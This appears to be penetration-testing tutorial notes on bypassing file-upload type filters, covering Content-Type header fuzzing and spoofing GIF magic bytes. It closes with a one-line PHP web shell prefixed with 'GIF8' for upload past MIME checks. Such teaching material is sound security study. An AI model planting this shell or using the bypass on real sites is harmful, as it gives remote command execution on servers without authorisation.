# Type Filters
***
#### There are two common methods for validating the file content : **Content-type Header** or **File Content**.

### Content-Type
#### We can detect if a web server is using this validation method by trying a validated extension (ex. shell.jpg) containing a web shell.
#### Example of Content-Type verification in PHP:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

#### We may start fuzzing the Content-Type header with [SecLists' Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt) to see which types are allowed.
#### When we want to fuzz for only image content-types we can  limit our scan by doing the following:
```bash
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt
$ cat content-type.txt | grep 'image/' > image-content-types.txt
```
#### **NOTE**: A file upload HTTP request has two Content-Type headers, one in the bottom for the attached file, and another for the full request (at the top). In some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as **POST** data), furthermore we will need to modify the main Content-Type header.

### MIME-Type (internet standard that determines the type of  file through its general format and bytes structure)
#### This is done by inspecting the first few bytes of the file's content, which contain the [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime) or [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
#### **NOTE**: A GIF image is particularly easy to mimic because its file signature begins with ASCII characters that can be printed, unlike many other image formats that use non-printable bytes. Since the string "GIF8" is a shared signature for both types of GIF files, replicating just this part is often sufficient to create a convincing imitation of a GIF image.

####  For instance , we can use the **file** command on UNIX systems to find the file type through the MIME type.
```bash
$ echo "this is a text file" > text.jpg 
$ file text.jpg 

text.jpg: ASCII text
```
#### As we see, the file's MIM type is **ASCII text** even though its extension is `.jpg`. Nonetheless , if we type `GIF8` in the beginning of the file, it will be considered as a GIF image instead.
#### Example:
```bash
$ echo "GIF8" > text.jpg 
$file text.jpg

text.jpg: GIF image data
```
#### Example in PHP of MIME type verification of an uploaded file:
```bash
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

#### Uploading a WebShell having a MIME type GIF, by imitating the GIF magic bytes.
```php
GIF8
<?php system($_GET['cmd']); ?>
```
